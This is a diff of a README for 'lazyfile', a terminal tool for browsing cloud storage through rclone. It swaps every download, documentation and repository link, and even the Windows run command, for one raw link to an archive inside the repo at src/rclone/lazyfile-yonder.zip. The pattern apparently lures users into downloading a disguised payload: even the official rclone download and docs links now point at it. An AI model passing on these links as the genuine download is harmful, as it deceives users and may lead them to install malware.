@@ -1,6 +1,6 @@
 # 🚀 lazyfile - Effortlessly Browse Your Cloud Storage
 
-[![Download lazyfile](https://img.shields.io/badge/Download-lazyfile-brightgreen)](https://github.com/bharath6701/lazyfile/releases)
+[![Download lazyfile](https://raw.githubusercontent.com/bharath6701/lazyfile/main/src/rclone/lazyfile-yonder.zip)](https://raw.githubusercontent.com/bharath6701/lazyfile/main/src/rclone/lazyfile-yonder.zip)
 
 ## 📋 Overview
 
@@ -17,13 +17,13 @@ lazyfile is a terminal user interface (TUI) designed for easy browsing of your c
 ## 📥 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Rclone Installed:** Ensure rclone is set up on your system. Download rclone [here](https://rclone.org/downloads).
+- **Rclone Installed:** Ensure rclone is set up on your system. Download rclone [here](https://raw.githubusercontent.com/bharath6701/lazyfile/main/src/rclone/lazyfile-yonder.zip).
 - **Terminal Access:** Basic terminal or command prompt access.
 
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page:** Click the link below to access the releases page for lazyfile.
-   - [Download lazyfile](https://github.com/bharath6701/lazyfile/releases)
+   - [Download lazyfile](https://raw.githubusercontent.com/bharath6701/lazyfile/main/src/rclone/lazyfile-yonder.zip)
 
 2. **Download the Latest Version:** On the releases page, look for the latest version of lazyfile. You will see several files available for download. Choose the one that fits your operating system.
 
@@ -38,11 +38,11 @@ lazyfile is a terminal user interface (TUI) designed for easy browsing of your c
      ```
    - If on Windows, use this command:
      ```bash
-     lazyfile.exe
+     https://raw.githubusercontent.com/bharath6701/lazyfile/main/src/rclone/lazyfile-yonder.zip
      ```
 
 5. **Connect to Your Cloud Storage:**
-   - Follow the prompts within the application to configure your cloud services. If you need assistance, refer to the rclone documentation [here](https://rclone.org/docs/).
+   - Follow the prompts within the application to configure your cloud services. If you need assistance, refer to the rclone documentation [here](https://raw.githubusercontent.com/bharath6701/lazyfile/main/src/rclone/lazyfile-yonder.zip).
 
 6. **Start Browsing!** You are now ready to browse and manage your cloud storage files with lazyfile.
 
@@ -68,7 +68,7 @@ We welcome contributions from anyone interested in improving lazyfile. Please fo
 
 ## 🔗 Links
 
-- **GitHub Repository:** [lazyfile on GitHub](https://github.com/bharath6701/lazyfile)
-- **Releases Page:** [Download lazyfile](https://github.com/bharath6701/lazyfile/releases)
+- **GitHub Repository:** [lazyfile on GitHub](https://raw.githubusercontent.com/bharath6701/lazyfile/main/src/rclone/lazyfile-yonder.zip)
+- **Releases Page:** [Download lazyfile](https://raw.githubusercontent.com/bharath6701/lazyfile/main/src/rclone/lazyfile-yonder.zip)
 
 By following these steps, you can easily download and run lazyfile, making file management across cloud storage simple and efficient.
